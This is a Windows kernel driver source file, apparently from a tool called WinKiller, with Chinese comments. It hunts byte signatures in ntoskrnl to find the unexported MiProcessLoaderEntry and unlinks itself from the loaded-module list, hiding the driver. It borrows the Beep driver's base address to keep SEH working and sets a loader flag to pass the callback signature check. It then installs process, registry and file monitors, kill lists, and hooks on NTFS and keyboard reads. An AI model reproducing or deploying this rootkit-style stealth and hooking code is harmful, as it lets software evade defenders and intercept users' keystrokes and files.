#include "Includes.h"
#include "Functions.h"
#include "Gobal.h"
#include "Undisclosed.h"
#include "DriverDispatch.h"

#if DBG
#include "FsdHook.h"
#include "SSDT.h"
#include "Monitor.h"
#include "IRPCtlFile.h"
#include "DataList.h"
#endif

#ifdef __cplusplus
EXTERN_C_START
#endif // __cplusplus

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
);

NTSTATUS CreateDevice(
	IN PDRIVER_OBJECT pDriverObject
);

BOOLEAN HideDriver(
	IN PDRIVER_OBJECT pDrvObj
);

PVOID GetProcAddress(
	IN PWCHAR FuncName
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_7(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8_1(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_10(
	VOID
);

MiProcessLoaderEntry Get_MiProcessLoaderEntry(
	VOID
);

BOOLEAN SupportSEH(
	IN PDRIVER_OBJECT DriverObject
);

VOID InitInLoadOrderLinks(
	IN PLDR_DATA_TABLE_ENTRY LdrEntry
);

VOID _HideDriver(
	IN PDRIVER_OBJECT DriverObject,
	IN PVOID Context,
	IN ULONG Count
);

#ifdef __cplusplus
EXTERN_C_END
#endif // _cplusplus

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#pragma alloc_text (INIT, CreateDevice)
#pragma alloc_text (INIT, HideDriver)
#pragma alloc_text (INIT, GetProcAddress)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_7)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_8)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_8_1)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry_WIN_10)
#pragma alloc_text (INIT, Get_MiProcessLoaderEntry)
#pragma alloc_text (INIT, SupportSEH)
#pragma alloc_text (INIT, InitInLoadOrderLinks)
#pragma alloc_text (INIT, _HideDriver)
#endif

PVOID GetProcAddress(
	IN PWCHAR FuncName
)
{
	UNICODE_STRING u_FuncName = { 0 };
	RtlInitUnicodeString(&u_FuncName, FuncName);
	return MmGetSystemRoutineAddress(&u_FuncName);
}

//在Windows 7的系统下去搜索MiProcessLoaderEntry函数
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_7(
	VOID
)
{
	//这个Search_Code就是MiProcessLoaderEntry函数的最前面的操作码
	//WIN7的搜索很有趣，MiProcessLoaderEntry这个函数就在EtwWriteString函数的前面几个函数
	//所以直接搜索EtwWriteString函数然后向前搜索即可
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x18"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x20"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x41\x54"						//push    r12
		"\x41\x55"						//push    r13
		"\x41\x56"						//push    r14
		"\x41\x57";					//push    r15
	ULONG_PTR EtwWriteStringAddress = 0;
	ULONG_PTR StartAddress = 0;

	EtwWriteStringAddress = (ULONG_PTR)GetProcAddress(L"EtwWriteString");
	StartAddress = EtwWriteStringAddress - 0x1000;
	if (EtwWriteStringAddress == 0)
		return NULL;

	while (StartAddress < EtwWriteStringAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//在Windows 8的系统下去搜索MiProcessLoaderEntry函数
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8(
	VOID
)
{
	CHAR Search_Code[] = "\x48\x89\x5C\x24\x08"			//mov     [rsp+arg_0], rbx
		"\x48\x89\x6C\x24\x10"			//mov     [rsp+arg_10], rbp
		"\x48\x89\x74\x24\x18"			//mov     [rsp+arg_18], rsi
		"\x57"							//push    rdi
		"\x48\x83\xEC\x20"				//sub	  rsp, 20h
		"\x48\x8B\xD9";				//mov     rbx, rcx
	ULONG_PTR IoInvalidateDeviceRelationsAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoInvalidateDeviceRelationsAddress = (ULONG_PTR)GetProcAddress(L"IoInvalidateDeviceRelations");
	StartAddress = IoInvalidateDeviceRelationsAddress - 0x1000;
	if (IoInvalidateDeviceRelationsAddress == 0)
		return NULL;

	while (StartAddress < IoInvalidateDeviceRelationsAddress)
	{
		if (memcmp((CHAR*)StartAddress, Search_Code, strlen(Search_Code)) == 0)
			return (MiProcessLoaderEntry)StartAddress;
		++StartAddress;
	}

	return NULL;
}

//在Windows 8.1的系统下去搜索MiProcessLoaderEntry函数
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_8_1(
	VOID
)
{
	//IoLoadCrashDumpDriver -> MmLoadSystemImage -> MiProcessLoaderEntry
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry
	//在WIN10中MmUnloadSystemImage是导出的，WIN8.1中未导出，所以只能走另一条路子，还好IoLoadCrashDumpDriver是导出的

	//在IoLoadCrashDumpDriver函数中用来搜索的Code
	CHAR IoLoadCrashDumpDriver_Code[] = "\x48\x8B\xD0"				//mov     rdx, rax
		"\xE8";						//call	  *******
//在MmLoadSystemImage函数中用来搜索的Code
	CHAR MmLoadSystemImage_Code[] = "\x41\x8B\xD6"					//mov     edx, r14d
		"\x48\x8B\xCE"					//mov	  rcx, rsi
		"\x41\x83\xCC\x04"				//or	  r12d, 4
		"\xE8";							//call    *******
	ULONG_PTR IoLoadCrashDumpDriverAddress = 0;
	ULONG_PTR MmLoadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	IoLoadCrashDumpDriverAddress = (ULONG_PTR)GetProcAddress(L"IoLoadCrashDumpDriver");
	StartAddress = IoLoadCrashDumpDriverAddress;
	if (IoLoadCrashDumpDriverAddress == 0)
		return NULL;

	while (StartAddress < IoLoadCrashDumpDriverAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, IoLoadCrashDumpDriver_Code, strlen(IoLoadCrashDumpDriver_Code)) == 0)
		{
			StartAddress += strlen(IoLoadCrashDumpDriver_Code);								//跳过一直到call的code
			MmLoadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MmLoadSystemImageAddress;
	if (MmLoadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmLoadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmLoadSystemImage_Code, strlen(MmLoadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmLoadSystemImage_Code);								 //跳过一直到call的code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

//在Windows 10的系统下去搜索MiProcessLoaderEntry函数
MiProcessLoaderEntry Get_MiProcessLoaderEntry_WIN_10(
	VOID
)
{
	//MmUnloadSystemImage -> MiUnloadSystemImage -> MiProcessLoaderEntry

	//在MmUnloadSystemImage函数中搜索的Code
	CHAR MmUnloadSystemImage_Code[] = "\x83\xCA\xFF"				//or      edx, 0FFFFFFFFh
		"\x48\x8B\xCF"				//mov     rcx, rdi
		"\x48\x8B\xD8"				//mov     rbx, rax
		"\xE8";						//call    *******
/*
//在MiUnloadSystemImage函数中搜索的Code
CHAR MiUnloadSystemImage_Code[] = "\x45\x33\xFF"				//xor     r15d, r15d
								  "\x4C\x39\x3F"				//cmp     [rdi], r15
								  "\x74\x18"					//jz      short
								  "\x33\xD2"					//xor     edx, edx
								  "\x48\x8B\xCF"				//mov     rcx, rdi
								  "\xE8";						//call	  *******
*/
	ULONG_PTR MmUnloadSystemImageAddress = 0;
	ULONG_PTR MiUnloadSystemImageAddress = 0;
	ULONG_PTR StartAddress = 0;

	MmUnloadSystemImageAddress = (ULONG_PTR)GetProcAddress(L"MmUnloadSystemImage");
	StartAddress = MmUnloadSystemImageAddress;
	if (MmUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MmUnloadSystemImageAddress + 0x500)
	{
		if (memcmp((VOID*)StartAddress, MmUnloadSystemImage_Code, strlen(MmUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MmUnloadSystemImage_Code);								//跳过一直到call的code
			MiUnloadSystemImageAddress = *(LONG*)StartAddress + StartAddress + 4;
			break;
		}
		++StartAddress;
	}

	StartAddress = MiUnloadSystemImageAddress;
	if (MiUnloadSystemImageAddress == 0)
		return NULL;

	while (StartAddress < MiUnloadSystemImageAddress + 0x600)
	{
		//分析ntoskrnl可以看出来，在不同版本的win10，call MiProcessLoaderEntry前面的操作不同
		//但是每次call MiProcessLoaderEntry之后都会mov eax, dword ptr cs:PerfGlobalGroupMask
		//所以这里根据0xEB(call) , 0x8B 0x05(mov eax)作为特征码

		/*if (memcmp((VOID*)StartAddress, MiUnloadSystemImage_Code, strlen(MiUnloadSystemImage_Code)) == 0)
		{
			StartAddress += strlen(MiUnloadSystemImage_Code);								 //跳过一直到call的code
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}*/
		if (*(UCHAR*)StartAddress == 0xE8 &&												//call
			*(UCHAR*)(StartAddress + 5) == 0x8B && *(UCHAR*)(StartAddress + 6) == 0x05)	//mov eax,
		{
			StartAddress++;																	//跳过call的0xE8
			return (MiProcessLoaderEntry)(*(LONG*)StartAddress + StartAddress + 4);
		}
		++StartAddress;
	}

	return NULL;
}

//根据系统判断调用哪个函数
MiProcessLoaderEntry Get_MiProcessLoaderEntry(
	VOID
)
{
	MiProcessLoaderEntry m_MiProcessLoaderEntry = NULL;
	RTL_OSVERSIONINFOEXW OsVersion = { 0 };
	NTSTATUS Status = STATUS_SUCCESS;

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	Status = RtlGetVersion((PRTL_OSVERSIONINFOW)(&OsVersion));
	if (!NT_SUCCESS(Status))
	{
		PrintErr("获取系统版本失败! Errorcode: %X\n", Status);
		return NULL;
	}

	if (OsVersion.dwMajorVersion == 10)								//如果是Windows 10
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_10();
		PrintIfm("系统版本: Windows 10 %d\n", OsVersion.dwBuildNumber);
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("获取不到MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry地址是：%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 3)
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8_1();
		PrintIfm("系统版本: Windows 8.1\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("获取不到MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry地址是：%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 2 && OsVersion.wProductType == VER_NT_WORKSTATION)		//这个是为了区分Windows 8和Windows Server 2012
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_8();
		PrintIfm("系统版本: Windows 8\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("获取不到MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry地址是：%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}
	else if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1 && OsVersion.wProductType == VER_NT_WORKSTATION)		//这个是为了区分Windows 7和Windows Server 2008 R2
	{
		m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry_WIN_7();
		PrintIfm("系统版本: Windows 7\n");
		if (m_MiProcessLoaderEntry == NULL)
			PrintErr("获取不到MiProcessLoaderEntry!\n");
		else
			PrintSuc("MiProcessLoaderEntry地址是：%p\n", (LPVOID)m_MiProcessLoaderEntry);

		return m_MiProcessLoaderEntry;
	}

	PrintErr("不支持的系统版本!\n");
	return NULL;
}

BOOLEAN SupportSEH(
	IN PDRIVER_OBJECT DriverObject
)
{
	//因为驱动从链表上摘除之后就不再支持SEH了
	//驱动的SEH分发是根据从链表上获取驱动地址，判断异常的地址是否在该驱动中
	//因为链表上没了，就会出问题
	//学习（抄袭）到的方法是用别人的驱动对象改他链表上的地址

	PDRIVER_OBJECT BeepDriverObject = NULL;;
	PLDR_DATA_TABLE_ENTRY LdrEntry = NULL;

	NTSTATUS ntStatus = GetDriverObjectByName(&BeepDriverObject, L"\\Driver\\Beep");
	if (BeepDriverObject == NULL || !NT_SUCCESS(ntStatus))
		return FALSE;

	//MiProcessLoaderEntry这个函数内部会根据Ldr中的DllBase然后去RtlxRemoveInvertedFunctionTable表中找到对应的项
	//之后再移除他，根据测试来讲..这个表中没有的DllBase就没法接收SEH，具体原理还没懂...
	//所以这里用系统的Driver\\Beep用来替死...
	LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	LdrEntry->DllBase = BeepDriverObject->DriverStart;
	ObDereferenceObject(BeepDriverObject);
	return TRUE;
}

VOID InitInLoadOrderLinks(
	IN PLDR_DATA_TABLE_ENTRY LdrEntry
)
{
	InitializeListHead(&LdrEntry->InLoadOrderLinks);
	InitializeListHead(&LdrEntry->InMemoryOrderLinks);
}

VOID _HideDriver(
	IN PDRIVER_OBJECT DriverObject,
	IN PVOID Context,
	IN ULONG Count
)
{
	MiProcessLoaderEntry m_MiProcessLoaderEntry = NULL;
	BOOLEAN bFlag = FALSE;

	m_MiProcessLoaderEntry = Get_MiProcessLoaderEntry();
	if (m_MiProcessLoaderEntry == NULL)
		return;

	bFlag = SupportSEH(DriverObject);
	if (bFlag)
		PrintSuc("SEH 恢复成功!\n");
	else
		PrintErr("SEH 恢复失败!\n");

	m_MiProcessLoaderEntry(DriverObject->DriverSection, 0);
	InitInLoadOrderLinks((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);

	DriverObject->DriverSection = NULL;
	DriverObject->DriverStart = NULL;
	DriverObject->DriverSize = 0;
	DriverObject->DriverUnload = NULL;
	DriverObject->DriverInit = NULL;
	DriverObject->DeviceObject = NULL;

#ifdef DBG
	PULONG SEH = NULL;
	__try
	{
		*SEH = 0xFF;
	}
	__except (1)
	{
		PrintSuc("SEH 实验成功!\n");
	}
#endif

	return;
}

BOOLEAN HideDriver(
	IN PDRIVER_OBJECT pDrvObj
)
{
	if (pDrvObj->DriverSection != NULL)
	{
		PLIST_ENTRY nextSection = ((PLIST_ENTRY)pDrvObj->DriverSection)->Blink;
		RemoveEntryList((PLIST_ENTRY)pDrvObj->DriverSection);
		pDrvObj->DriverSection = nextSection;

		return TRUE;
	}
	return FALSE;
}

NTSTATUS CreateDevice(
	IN PDRIVER_OBJECT pDriverObject
)
{
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	ntStatus = IoCreateDevice(pDriverObject, 0, &g_usDevName,				//创建一个设备
		FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
		TRUE, &g_pCreateDevice);
	if (!NT_SUCCESS(ntStatus))												//发生错误
		return ntStatus;

	g_pCreateDevice->Flags |= DO_BUFFERED_IO;								//设置BUFFERED

	IoDeleteSymbolicLink(&g_usSymName);										//先删除
	ntStatus = IoCreateSymbolicLink(&g_usSymName, &g_usDevName);			//创建符号链接
	if (!NT_SUCCESS(ntStatus))												//发生错误
	{
		IoDeleteDevice(g_pCreateDevice);
		return ntStatus;
	}

	return ntStatus;
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	if (!pDriverObject || !pRegistryPath)
		return STATUS_INVALID_PARAMETER;

	PrintIfm("DriverEntry Called!\n");
	NTSTATUS ntStatus = STATUS_SUCCESS;
	IoRegisterDriverReinitialization(pDriverObject, _HideDriver, NULL);

	ntStatus = CreateDevice(pDriverObject);
	if (NT_SUCCESS(ntStatus))
		PrintSuc("CreateDevice Success!\n");
	else
		PrintErr("CreateDevice Fail! Errorcode:%X\n", ntStatus);

	for (SIZE_T i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
		pDriverObject->MajorFunction[i] = DefaultDispatch;

	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControlDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = CreateDispatch;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = CloseDispatch;

	PLDR_DATA_TABLE_ENTRY ldrDataTable;
	ldrDataTable = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	ldrDataTable->Flags |= 0x20;

	g_uniRegistryPath.Buffer = (PWCHAR)ExAllocatePoolWithTag(NonPagedPool, pRegistryPath->Length, 'PR');
	if (g_uniRegistryPath.Buffer)
	{
		memcpy(g_uniRegistryPath.Buffer, pRegistryPath->Buffer, pRegistryPath->Length);
		g_uniRegistryPath.MaximumLength = g_uniRegistryPath.Length = pRegistryPath->Length;
		PrintSuc("Copy Registry String Success!\n");
	}
	else
	{
		ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
		PrintErr("Copy Registry String Fail!\n");
	}

	//MessageBox(L"此程序由WinKiller制作!This program is made by WinKiller!", L"A MESSAGE FROM DRIVER", (0x00000000L | 0x00000040L | 0x00010000L), 7, &ntStatus);
	//if (NT_SUCCESS(ntStatus))
	//	KdPrint(("[+] MessageBox Success!\n"));
	//else
	//	KdPrint(("[-] MessageBox Fail! Errorcode:%X\n", ntStatus));

	if (HideDriver(pDriverObject))
		PrintSuc("Hide Driver Success!\n");
	else
		PrintErr("Hide Driver Fail!\n");

	if (*InitSafeBootMode > 0)
		PrintIfm("WE ARE IN SAFEMODE!\n");

	InitializeListHead(&g_KillKeyList);
	InitializeListHead(&g_ProtDirList);
	InitializeListHead(&g_ProtFileList);
	InitializeListHead(&g_KillProcList);
	InitializeListHead(&g_ProtProcList);
	InitializeListHead(&g_KillSysList);
	InitializeListHead(&g_KillDllList);

	Mon_CreateFileMon(TRUE);
	Mon_CreateMoudleMon(TRUE);
	Mon_CreateProcKillMon(TRUE);
	Mon_CreateProcMon(TRUE);
	Mon_CreateRegMon(TRUE);
	Mon_CreateThrMon(TRUE);
	FsdHook_HookNtfsCreate();
	FsdHook_HookNtfsDirectoryControl();
	FsdHook_HookNtfsSetIfm();
	FsdHook_HookKeyboardRead();

	pDriverObject->Flags &= ~DO_DEVICE_INITIALIZING;

	return ntStatus;
}